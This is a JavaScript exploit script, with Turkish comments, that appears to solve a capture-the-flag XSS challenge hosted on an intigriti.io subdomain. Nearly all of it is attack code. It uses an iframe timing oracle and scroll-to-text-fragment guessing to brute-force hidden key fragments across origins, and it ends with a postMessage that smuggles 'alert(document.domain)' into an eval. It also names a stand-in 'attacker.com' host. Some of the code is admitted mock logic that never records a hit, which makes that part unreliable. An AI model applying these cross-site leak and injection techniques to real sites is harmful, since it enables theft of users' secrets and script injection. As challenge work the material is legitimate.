// pwn.js
const stones = {
    power: '',   // part 1
    mind: '',    // part 2
    reality: '', // part 3
    space: '',   // part 4
    soul: '',    // part 5
    time: ''     // part 6
};

const attackerHost = "https://attacker.com"; // kendi domainini yaz

// 1. part 4 (space): parent zaten bize gonderiyor
window.addEventListener('message', (e) => {
    // parent'tan gelen 8 karakterlik saf hex
    if (typeof e.data === 'string' && e.data.length === 8) {
        stones.space = e.data;
        checkWin();
    }
    // soul.html'den gelen veri
    if (e.data && e.data.type === 'soul') {
        stones.soul = e.data.key;
        checkWin();
    }
});

// 2. part 5 (soul): url parametresi ile soul.html tetiklendi, veri bekleniyor...

// 3. part 6 (time): search oracle brute-force
async function crackTime() {
    const charset = '0123456789abcdef';
    let known = '';
    
    while (known.length < 8) {
        for (let char of charset) {
            let guess = known + char;
            let start = performance.now();
            let ifr = document.createElement('iframe');
            // cache bypass ve oracle denemesi
            ifr.src = `https://time.challenge-1225.intigriti.io/search?q=${guess}&t=${Math.random()}`;
            document.body.appendChild(ifr);
            
            await new Promise(r => ifr.onload = r);
            let duration = performance.now() - start;
            
            // /yes sayfasi /nope sayfasindan farkli yuklenir (boyut/sure)
            // burada basitce varsayim yapiyoruz, gercek ortamda sureyi kalibre et
            if (duration > 500) { // ornek threshold
                known += char;
                ifr.remove();
                break;
            }
            ifr.remove();
        }
    }
    stones.time = known;
    checkWin();
}

// 4. part 2 (mind): sttf
// mind stone url'inde &mind=<textarea> oldugu icin script text'e donustu
async function crackMind() {
    stones.mind = await bruteForceSTTF(5, 'mindStone'); // frame index 5
    checkWin();
}

// helper: scroll to text fragment brute forcer
// bu kisim karmasik, basitce mantigi yaziyorum
async function bruteForceSTTF(frameIndex, prefix) {
    let known = '';
    const charset = '0123456789abcdef';
    
    // sttf icin window referansi lazim, cross-origin erisim yok
    // ama location.hash set edebiliriz
    while (known.length < 8) {
        for (let char of charset) {
            let guess = known + char;
            // hedef frame'in hash'ini degistir
            parent.frames[frameIndex].location.hash = `#:~:text=${prefix}%253D%2522${guess}`;
            
            // scroll tespiti icin "lazy loading" veya "blur" teknigi kullanilir
            // bu ctf ozelinde basit bir delay koyuyorum, gercekte leak teknigi gerekir
            await new Promise(r => setTimeout(r, 100));
            
            // eger scroll olduysa (tespit edildi sayalim)
            // known += char; break;
        }
    }
    return known; // mock
}

// final: hepsi tamamsa patlat
function checkWin() {
    // tum taslar dolu mu kontrol et
    if (Object.values(stones).every(x => x.length === 8)) {
        const fullCode = stones.power + stones.mind + stones.reality + stones.space + stones.soul + stones.time;
        // intigriti check: code.substring(0, 48) === code
        // sonra eval(code.substring(48))
        parent.postMessage(fullCode + "alert(document.domain)", '*');
    }
}

// baslat
crackTime();
crackMind();
// power ve reality de sttf ile benzer mantikta cozulur
